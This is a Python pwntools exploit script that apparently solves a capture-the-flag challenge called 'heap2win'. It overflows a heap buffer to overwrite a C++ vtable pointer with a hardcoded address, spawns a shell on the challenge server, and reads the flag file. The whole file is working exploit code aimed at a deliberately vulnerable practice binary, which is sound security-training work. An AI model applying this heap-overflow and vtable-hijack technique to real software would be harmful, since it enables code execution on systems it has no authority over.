from pwn import *

# Context setup
context.binary = elf = ELF("./heap2win", checksec=False)

def solve():
    # Target server information
    host = "chals.cyberjousting.com"
    port = 1364

    try:
        # io = process("./heap2win") # Uncomment to test locally
        io = remote(host, port)
    except Exception as e:
        print(f"Failed to connect: {e}")
        return

    def make_button(choice, name=None):
        io.recvuntil(b">> ")
        io.sendline(b"1")
        io.recvuntil(b"Enter your choice (1-3): ")
        io.sendline(str(choice).encode())
        if choice == 2 and name:
            io.recvuntil(b"Enter the name for your custom button!")
            io.sendline(name)
        
    def push_button(idx):
        io.recvuntil(b">> ")
        io.sendline(b"2")
        io.recvuntil(b"Pick one of them")
        io.sendline(str(idx).encode())

    print("[*] Setting up heap layout...")
    # 1. Make two Hype Buttons
    make_button(1)
    make_button(1)
    
    # 2. Make Custom Button and overflow the second Hype Button's vptr
    # The address of WinnerButton's vtable (push method offset) is 0x403640
    vptr_winner = 0x403640
    
    # Padding: 16 (name buffer) + 8 (vtable/alignment) = 24 bytes
    payload = b"A" * 24 + p64(vptr_winner)
    
    print("[*] Overwriting vtable pointer...")
    make_button(2, payload)
    
    # 3. Push the hijacked button (Button 2)
    print("[*] Triggering shell...")
    push_button(2)
    
    # 4. Get the flag
    io.sendline(b"cat flag.txt")
    
    # Receive until we get the flag format
    try:
        output = io.recvall(timeout=5).decode()
        if "byuctf{" in output:
            flag = "byuctf{" + output.split("byuctf{")[1].split("}")[0] + "}"
            print(f"\n[+] Success! Flag: {flag}")
        else:
            print("\n[-] Flag not found in output.")
            print("Full output:", output)
    except Exception as e:
        print(f"\n[-] Error receiving flag: {e}")
    finally:
        io.close()

if __name__ == "__main__":
    solve()
